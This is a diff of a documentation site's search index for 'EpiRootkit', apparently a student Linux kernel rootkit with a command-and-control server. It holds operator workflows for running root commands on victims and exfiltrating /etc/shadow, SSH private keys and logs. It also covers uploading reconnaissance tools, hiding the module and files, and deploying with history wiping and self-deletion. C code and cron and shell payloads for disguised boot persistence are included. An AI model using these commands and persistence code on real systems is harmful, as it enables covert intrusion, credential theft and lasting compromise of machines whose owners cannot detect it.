Client-1 # Module Hidden: YES # File Hiding: YES # Test module hiding exec Client-1 lsmod | grep epirootkit # (no output - module hidden) # Test file hiding exec Client-1 touch /tmp/epirootkit_test exec Client-1 ls /tmp/ | grep epirootkit # (no output - file hidden) # But file still accessible exec Client-1 cat /tmp/epirootkit_test # (works normally) Configuration Management link # Interactive configuration config Client-1 # ┌─ Configuration - Client-1 # [X] Module Hiding (Click to disable) # [X] File Hiding (Click to disable) # [X] Persistence (Click to disable) # Direct commands hide_module Client-1 # SUCCESS: Module hidden unhide_module Client-1 # SUCCESS: Module visible hide_files Client-1 # SUCCESS: File hiding enabled Real-World Scenarios linkInitial Compromise link # 1. Gain foothold auth Client-1 password # 2. Reconnaissance exec Client-1 id exec Client-1 hostname exec Client-1 cat /etc/os-release # 3. Enable stealth hide_module Client-1 hide_files Client-1 # 4. Establish persistence persist Client-1 install Data Exfiltration link # System information download Client-1 /etc/passwd download Client-1 /etc/shadow download Client-1 /etc/hosts # User data download Client-1 /home/user/.bash_history download Client-1 /home/user/.ssh/known_hosts # Log files download Client-1 /var/log/auth.log download Client-1 /var/log/syslog Lateral Movement Preparation link # Network reconnaissance exec Client-1 ip route show exec Client-1 arp -a exec Client-1 ss -tulpn # Upload tools upload Client-1 ./tools/nmap /tmp/scanner upload Client-1 ./tools/linpeas.sh /tmp/enum.sh exec Client-1 chmod +x /tmp/scanner /tmp/enum.sh # Execute reconnaissance exec Client-1 /tmp/enum.sh \u003e /tmp/results.txt download Client-1 /tmp/results.txt ./recon/ Persistence Testing link # Before reboot status Client-1 persist Client-1 install # Simulate reboot exec Client-1 sudo systemctl reboot # Connection lost... # After victim reboots (auto-reconnect) ls # • Client-1 - UNAUTHENTICATED - Last seen: Just now auth Client-1 password status Client-1 # Persistence: ENABLED ✓ Error Handling linkCommon Issues link # Client not found auth Client-999 password # ERROR: Client not found # Authentication failed auth Client-1 wrongpass # ERROR: Authentication failed # Rate limiting auth Client-1 wrong1 auth Client-1 wrong2 # ... (after 5 attempts) # ERROR: Rate limited. Try again in 60 seconds # Command on unauthenticated client exec Client-1 whoami # ERROR: Client not authenticated Connection Issues link # Check connection status keepalive Client-1 # Failed pings: 3 # Connection: UNSTABLE # Client disconnected exec Client-1 whoami # ERROR: Client disconnected # Network timeout download Client-1 /huge/file.bin # ERROR: Network timeout "
+                content: "Usage Guide linkComplete workflows for the EpiRootkit C2 server.\nQuick Start link1. Start C2 Server link cd attacking_program pnpm start # ✓ Server started on port 4444 # ✓ Web interface started on port 3000 2. Install Rootkit (Victim) link sudo insmod epirootkit.ko # C2 server shows: ✓ Client-1 Connected 3. Authenticate link auth Client-1 password # ✓ [2025-05-25 16:13:30] Authenticated # SUCCESS: Authentication successful Basic Workflows linkClient Management link # List clients ls # • Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM # • Client-2 - UNAUTHENTICATED - Last seen: 6:10:15 PM # Check status status Client-1 # EpiRootkit Status: # Version: 1.0.0 # Authentication: YES # Module Hidden: YES # Persistence: ENABLED # Monitor connection keepalive Client-1 # Last ping: 2025-05-25 16:14:00 # Connection: STABLE Command Execution link # System reconnaissance exec Client-1 whoami # Exit code: 0 # Output: root exec Client-1 uname -a # Linux victim 5.4.0-74-generic #83-Ubuntu x86_64 GNU/Linux exec Client-1 ps aux | head -5 # USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND # root 1 0.0 0.1 225468 9876 ? Ss 15:00 0:01 /sbin/init # Network information exec Client-1 ip addr show exec Client-1 netstat -tuln File Transfer link # Upload files upload Client-1 ./script.sh /tmp/script.sh # ✓ File uploaded successfully (512 bytes) exec Client-1 chmod +x /tmp/script.sh exec Client-1 /tmp/script.sh # Download files download Client-1 /etc/passwd ./passwd # ✓ File downloaded successfully (2048 bytes) download Client-1 /home/user/.ssh/id_rsa ./keys/ # ✓ File downloaded successfully (1679 bytes) Advanced Workflows linkPersistence Setup link # Install all persistence mechanisms persist Client-1 install # SUCCESS: All persistence mechanisms installed # Test persistence (victim reboots) exec Client-1 reboot # Wait for reconnection... ls # • Client-1 - UNAUTHENTICATED - Last seen: Just now auth Client-1 password status Client-1 # Persistence: ENABLED (survived reboot) Stealth Operations link # Check current stealth status status Client-1 # Module Hidden: YES # File Hiding: YES # Test module hiding exec Client-1 lsmod | grep epirootkit # (no output - module hidden) # Test file hiding exec Client-1 touch /tmp/epirootkit_test exec Client-1 ls /tmp/ | grep epirootkit # (no output - file hidden) # But file still accessible exec Client-1 cat /tmp/epirootkit_test # (works normally) Configuration Management link # Interactive configuration config Client-1 # ┌─ Configuration - Client-1 # [X] Module Hiding (Click to disable) # [X] File Hiding (Click to disable) # [X] Persistence (Click to disable) # Direct commands hide_module Client-1 # SUCCESS: Module hidden unhide_module Client-1 # SUCCESS: Module visible hide_files Client-1 # SUCCESS: File hiding enabled "
             }
         );
     index.add(
             {
-                id:  11 ,
+                id:  12 ,
                 href: "\/docs\/04-web-ui\/",
                 title: "Web UI (C2 Frontend)",
                 description: "Modern React-based web interface for EpiRootkit C2 server management",
@@ -537,7 +553,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  12 ,
+                id:  13 ,
                 href: "\/docs\/04-web-ui\/overview\/",
                 title: "Overview",
                 description: "Modern web interface for EpiRootkit C2 server",
@@ -546,7 +562,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  13 ,
+                id:  14 ,
                 href: "\/docs\/04-web-ui\/installation\/",
                 title: "Installation \u0026 Setup",
                 description: "How to install and launch the Web UI",
@@ -555,7 +571,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  14 ,
+                id:  15 ,
                 href: "\/docs\/04-web-ui\/features\/",
                 title: "Features",
                 description: "Web UI capabilities and components",
@@ -564,7 +580,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  15 ,
+                id:  16 ,
                 href: "\/docs\/04-web-ui\/features\/authentication\/",
                 title: "Authentication",
                 description: "Secure login with JWT tokens and session management",
@@ -573,7 +589,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  16 ,
+                id:  17 ,
                 href: "\/docs\/04-web-ui\/features\/dashboard\/",
                 title: "Dashboard",
                 description: "Real-time client monitoring and statistics",
@@ -582,7 +598,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  17 ,
+                id:  18 ,
                 href: "\/docs\/04-web-ui\/features\/client-management\/",
                 title: "Client Management",
                 description: "Monitor and interact with connected rootkit clients",
@@ -591,7 +607,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  18 ,
+                id:  19 ,
                 href: "\/docs\/04-web-ui\/features\/panels\/terminal-panel\/",
                 title: "Terminal Panel",
                 description: "Remote command execution interface with terminal emulation",
@@ -600,7 +616,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  19 ,
+                id:  20 ,
                 href: "\/docs\/04-web-ui\/features\/panels\/",
                 title: "UI Panels",
                 description: "Individual Web UI panel components",
@@ -609,7 +625,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  20 ,
+                id:  21 ,
                 href: "\/docs\/04-web-ui\/features\/panels\/persistence-panel\/",
                 title: "Persistence Panel",
                 description: "Boot persistence configuration and management",
@@ -618,7 +634,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  21 ,
+                id:  22 ,
                 href: "\/docs\/04-web-ui\/features\/panels\/event-log-panel\/",
                 title: "Event Log Panel",
                 description: "Activity and event monitoring interface",
@@ -627,7 +643,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  22 ,
+                id:  23 ,
                 href: "\/docs\/04-web-ui\/features\/panels\/upload-download-panel\/",
                 title: "Upload/Download Panel",
                 description: "File transfer interface with drag-and-drop support",
@@ -636,7 +652,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  23 ,
+                id:  24 ,
                 href: "\/docs\/04-web-ui\/features\/panels\/overview-panel\/",
                 title: "Overview Panel",
                 description: "Client status and quick actions dashboard",
@@ -645,7 +661,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  24 ,
+                id:  25 ,
                 href: "\/docs\/04-web-ui\/features\/panels\/configuration-panel\/",
                 title: "Configuration Panel",
                 description: "Rootkit settings and configuration management",
@@ -654,7 +670,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  25 ,
+                id:  26 ,
                 href: "\/docs\/04-web-ui\/features\/panels\/authentication-panel\/",
                 title: "Authentication Panel",
                 description: "Client authentication management and security interface",
@@ -663,7 +679,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  26 ,
+                id:  27 ,
                 href: "\/docs\/05-epirootkit\/",
                 title: "EpiRootkit",
                 description: "Linux kernel rootkit implementation for kernel 5.4.0",
@@ -672,7 +688,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  27 ,
+                id:  28 ,
                 href: "\/docs\/05-epirootkit\/configuration-justifications\/",
                 title: "Configuration Justifications",
                 description: "Why Ubuntu 20.04 LTS with kernel 5.4.0-26-generic",
@@ -681,7 +697,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  28 ,
+                id:  29 ,
                 href: "\/docs\/05-epirootkit\/overview\/",
                 title: "EpiRootkit Overview",
                 description: "Linux kernel rootkit for Ubuntu 20.04 / kernel 5.4.0",
@@ -690,16 +706,16 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  29 ,
+                id:  30 ,
                 href: "\/docs\/05-epirootkit\/deployment\/",
                 title: "Build \u0026 Deployment",
                 description: "How to build and load EpiRootkit on Ubuntu 20.04",
-                content: "Build \u0026 Deployment linkHow to build and deploy EpiRootkit on Ubuntu 20.04 with kernel 5.4.0.\nRequirements linkSystem link OS: Ubuntu 20.04 LTS Kernel: 5.4.0-* (check with uname -r) Architecture: x86_64 Dependencies link sudo apt update sudo apt install -y build-essential linux-headers-$(uname -r) Configuration linkEdit rootkit/core/config.h before building:\n// Option 1: Domain name (recommended) #define C2_SERVER_ADDRESS \"jules-c2.example.com\" #define C2_SERVER_PORT 4444 // Option 2: IP address (traditional) #define C2_SERVER_ADDRESS \"192.168.64.1\" #define C2_SERVER_PORT 4444 // Feature settings #define ENABLE_ENCRYPTION 1 // XOR encryption enabled #define ENABLE_PERSISTENCE 1 // Auto-install persistence #define ENABLE_MODULE_HIDING 1 // Hide module by default #define ENABLE_FILE_HIDING 1 // Hide files with prefixes Build link cd rootkit make clean \u0026\u0026 make # ✓ Build successful: epirootkit.ko created Deployment linkQuick Deploy (Recommended) link # Deploy with domain name sudo ./deploy_rootkit.sh address=jules_chef_de_majeur.epirootkit.com # Deploy with IP address sudo ./deploy_rootkit.sh address=192.168.1.100 port=4444 # Deploy with defaults from config.h sudo ./deploy_rootkit.sh Manual Loading link # Load with domain sudo insmod epirootkit.ko address=jules_chef_de_majeur.epirootkit.com # Load with IP sudo insmod epirootkit.ko address=192.168.1.100 port=4444 # Load with defaults sudo insmod epirootkit.ko Management linkCheck Status link sudo ./deploy_rootkit.sh status # Module Status: LOADED # Location: /lib/modules/5.4.0-74-generic/extra/epirootkit.ko # Autoload: ENABLED (/etc/modules-load.d/epirootkit.conf) # Connection: CONNECTED (c2.example.com:443) Complete Removal link sudo ./deploy_rootkit.sh uninstall # ✓ Module unloaded # ✓ Autoload disabled # ✓ Module file removed # ✓ Dependencies updated Domain Support: The rootkit supports both domain names and IP addresses. For DNS resolution details, see "
+                content: "Build \u0026 Deployment linkHow to build and deploy EpiRootkit on Ubuntu 20.04 with kernel 5.4.0.\nRequirements linkSystem link OS: Ubuntu 20.04 LTS Kernel: 5.4.0-* (check with uname -r) Dependencies link sudo apt update sudo apt install -y build-essential linux-headers-$(uname -r) Build link cd rootkit make clean \u0026\u0026 make # ✓ Build successful: epirootkit.ko created Deployment linkDeployment Script link # Default usage (uses ./epirootkit.ko automatically) sudo ./deploy_rootkit.sh # Custom C2 server sudo ./deploy_rootkit.sh ./epirootkit.ko address=192.168.200.11 port=4444 # Domain-based deployment sudo ./deploy_rootkit.sh address=jules_chef_de_majeur.epirootkit.com # Stealth deployment with self-cleanup sudo ./deploy_rootkit.sh --self-delete # Verbose deployment (show output) sudo ./deploy_rootkit.sh --verbose Deployment Options link Option Description --verbose Show detailed output during deployment --self-delete Remove script after successful deployment status Check current deployment status uninstall Remove module and cleanup Advanced Usage link # Ultimate stealth deployment sudo ./deploy_rootkit.sh address=c2.example.com port=443 --self-delete # Deploy with verbose output then self-destruct sudo ./deploy_rootkit.sh --verbose --self-delete # Check deployment status sudo ./deploy_rootkit.sh status # Status: Active (hidden) # Note: Persistence is managed internally by the rootkit # Remove deployment sudo ./deploy_rootkit.sh uninstall # Module uninstalled Manual Loading (Alternative) link # Load with domain sudo insmod epirootkit.ko address=jules-c2.example.com # Load with IP sudo insmod epirootkit.ko address=192.168.200.11 port=4444 # Load with defaults from config.h sudo insmod epirootkit.ko Self-Cleanup Features linkThe deployment script includes advanced stealth capabilities:\nTrace Cleanup link Temp files: Removes all /tmp/jules_est_bo_* files History cleanup: Removes deployment commands from bash history Stealth backup: Creates and removes backup module files Self-Destruction link # Deploy and vanish completely sudo ./deploy_rootkit.sh --self-delete # Deployment successful # Self-deleting deployment script... # (script file removed automatically) Management linkCheck Status link sudo ./deploy_rootkit.sh status # Status: Active (hidden) # Note: Persistence is managed internally by the rootkit Default Behavior link Module file: Uses ./epirootkit.ko by default if no file specified C2 address: Uses 192.168.200.11:4444 by default Stealth mode: Silent operation by default (use --verbose for output) Persistence: Automatically handled by rootkit internal mechanisms Complete Removal link sudo ./deploy_rootkit.sh uninstall # Module uninstalled # Note: Rootkit persistence may remain - use rootkit's own removal commands Domain Support: The rootkit supports both domain names and IP addresses. For DNS resolution details, see "
             }
         );
     index.add(
             {
-                id:  30 ,
+                id:  31 ,
                 href: "\/docs\/05-epirootkit\/connection-authentication\/",
                 title: "Connection \u0026 Authentication",
                 description: "How the rootkit connects to C2 server and authenticates",
@@ -708,7 +724,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  31 ,
+                id:  32 ,
                 href: "\/docs\/05-epirootkit\/features\/",
                 title: "Features",
                 description: "EpiRootkit core functionality and capabilities",
@@ -717,7 +733,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  32 ,
+                id:  33 ,
                 href: "\/docs\/05-epirootkit\/features\/command-execution\/",
                 title: "Command Execution",
                 description: "Execute shell commands remotely with full output capture",
@@ -726,7 +742,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  33 ,
+                id:  34 ,
                 href: "\/docs\/05-epirootkit\/features\/file-transfer\/",
                 title: "File Transfer",
                 description: "Upload and download files between C2 server and victim system",
@@ -735,7 +751,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  34 ,
+                id:  35 ,
                 href: "\/docs\/05-epirootkit\/features\/hiding\/",
                 title: "Stealth \u0026 Hiding",
                 description: "Module hiding and file hiding capabilities",
@@ -744,16 +760,16 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  35 ,
+                id:  36 ,
                 href: "\/docs\/05-epirootkit\/features\/persistence\/",
                 title: "Persistence",
                 description: "Multiple boot persistence mechanisms for rootkit survival",
-                content: "Persistence linkMultiple boot persistence mechanisms to ensure rootkit survival across system reboots.\nThree Mechanisms link1. modules-load.d linkFile: /etc/modules-load.d/epirootkit.conf\nContent: epirootkit\nTrigger: systemd reads config and loads module automatically on boot\n2. Cron Jobs linkFile: /etc/cron.d/system-update\nSchedule: Every 5 minutes check and load if not present\nStealth: Disguised as system update task\n3. Shell Profiles linkFile: /etc/profile.d/system-env.sh\nTrigger: Executes when root user logs in\nCheck: Loads module if not already present\nImplementation linkAutomatic Installation link int persistence_init(void) { return persistence_install(); // Install all mechanisms } Individual Mechanisms link // modules-load.d persistence int persistence_install_modules_load(void) { return write_file(\"/etc/modules-load.d/epirootkit.conf\", \"epirootkit\\n\"); } // Cron persistence (every 5 minutes) int persistence_install_cron(void) { const char *cron_content = \"*/5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then \" \"modprobe epirootkit 2\u003e/dev/null || \" \"insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2\u003e/dev/null; fi'\\n\"; return write_file(\"/etc/cron.d/system-update\", cron_content, 0644); } // Shell profile persistence int persistence_install_shell_profile(void) { const char *profile_content = \"#!/bin/bash\\n\" \"if [ \\\"$(id -u)\\\" -eq 0 ]; then\\n\" \" if ! lsmod | grep -q epirootkit 2\u003e/dev/null; then\\n\" \" modprobe epirootkit 2\u003e/dev/null\\n\" \" fi\\n\" \"fi\\n\"; return write_file(\"/etc/profile.d/system-env.sh\", profile_content, 0755); } Usage linkWebUI Control linkAccess via Persistence panel:\nInstall All: Enable all three mechanisms Remove All: Disable all mechanisms Individual Control: Toggle each mechanism separately C2 Commands link # Install all persistence mechanisms persist_install Client-1 # Remove all mechanisms persist_remove Client-1 # Individual control persist_modules Client-1 # modules-load.d only persist_cron Client-1 # cron only persist_profile Client-1 # shell profile only Verification linkCheck Installation link # modules-load.d cat /etc/modules-load.d/epirootkit.conf # epirootkit # Cron job cat /etc/cron.d/system-update # */5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then modprobe epirootkit 2\u003e/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2\u003e/dev/null; fi' # Shell profile cat /etc/profile.d/system-env.sh # #!/bin/bash # if [ \"$(id -u)\" -eq 0 ]; then # if ! lsmod | grep -q epirootkit 2\u003e/dev/null; then # modprobe epirootkit 2\u003e/dev/null # fi # fi Test Persistence link # Remove module and reboot rmmod epirootkit reboot # Check if module reloaded lsmod | grep epirootkit # epirootkit 20480 0 All mechanisms are enabled by default and can be managed via WebUI or C2 commands.\n"
+                content: "Persistence linkMultiple boot persistence mechanisms to ensure rootkit survival across system reboots.\nThree Mechanisms link1. modules-load.d linkFile: /etc/modules-load.d/jules_est_bo_system.conf\nContent: epirootkit address=X.X.X.X port=YYYY\nTrigger: systemd reads config and loads module automatically on boot\n2. Cron Jobs linkFile: /etc/cron.d/jules_est_bo_update\nSchedule: Every 5 minutes check and load if not present\nStealth: Disguised as system update task with stealth naming\n3. Shell Profiles linkFile: /etc/profile.d/jules_est_bo_env.sh\nTrigger: Executes when root user logs in\nCheck: Loads module if not already present\nImplementation linkAutomatic Installation link int persistence_init(void) { return persistence_install(); // Install all mechanisms } Individual Mechanisms link // modules-load.d persistence int persistence_install_modules_load(void) { return write_file(\"/etc/modules-load.d/jules_est_bo_system.conf\", \"epirootkit address=X.X.X.X port=YYYY\\n\"); } // Cron persistence (every 5 minutes) int persistence_install_cron(void) { const char *cron_content = \"*/5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then \" \"modprobe epirootkit 2\u003e/dev/null || \" \"insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2\u003e/dev/null; fi'\\n\"; return write_file(\"/etc/cron.d/jules_est_bo_update\", cron_content, 0644); } // Shell profile persistence int persistence_install_shell_profile(void) { const char *profile_content = \"#!/bin/bash\\n\" \"if [ \\\"$(id -u)\\\" -eq 0 ]; then\\n\" \" if ! lsmod | grep -q epirootkit 2\u003e/dev/null; then\\n\" \" modprobe epirootkit 2\u003e/dev/null\\n\" \" fi\\n\" \"fi\\n\"; return write_file(\"/etc/profile.d/jules_est_bo_env.sh\", profile_content, 0755); } Usage linkWebUI Control linkAccess via Persistence panel:\nInstall All: Enable all three mechanisms Remove All: Disable all mechanisms Individual Control: Toggle each mechanism separately C2 Commands link # Install all persistence mechanisms persist_install Client-1 # Remove all mechanisms persist_remove Client-1 # Individual control persist_modules Client-1 # modules-load.d only persist_cron Client-1 # cron only persist_profile Client-1 # shell profile only Verification linkCheck Installation link # modules-load.d cat /etc/modules-load.d/jules_est_bo_system.conf # epirootkit address=X.X.X.X port=YYYY # Cron job cat /etc/cron.d/jules_est_bo_update # */5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then modprobe epirootkit 2\u003e/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2\u003e/dev/null; fi' # Shell profile cat /etc/profile.d/jules_est_bo_env.sh # #!/bin/bash # if [ \"$(id -u)\" -eq 0 ]; then # if ! lsmod | grep -q epirootkit 2\u003e/dev/null; then # modprobe epirootkit 2\u003e/dev/null # fi # fi Test Persistence link # Remove module and reboot rmmod epirootkit reboot # Check if module reloaded lsmod | grep epirootkit # epirootkit 20480 0 All mechanisms are enabled by default and can be managed via WebUI or C2 commands.\n"
             }
         );
     index.add(
             {
-                id:  36 ,
+                id:  37 ,
                 href: "\/docs\/05-epirootkit\/features\/dns-resolution\/",
                 title: "DNS Resolution",
                 description: "Kernel-space domain name resolution for flexible C2 connectivity",
@@ -762,7 +778,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  37 ,
+                id:  38 ,
                 href: "\/docs\/05-epirootkit\/features\/encryption\/",
                 title: "XOR Encryption",
                 description: "Simple, reliable encryption for C2 communication",
@@ -771,7 +787,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  38 ,
+                id:  39 ,
                 href: "\/docs\/06-bonuses\/wlkom-ctf\/",
                 title: "Tux Fan Club: Chasse au Trésor Pirate",
                 description: "Cap'tain René Bojolais est un petit cachotier.",
@@ -780,7 +796,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  39 ,
+                id:  40 ,
                 href: "\/docs\/07-remerciements\/thankyou\/",
                 title: "Un dernier mot",
                 description: "Merci \u003c3",
@@ -789,7 +805,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  40 ,
+                id:  41 ,
                 href: "\/docs\/",
                 title: "Docs",
                 description: "",
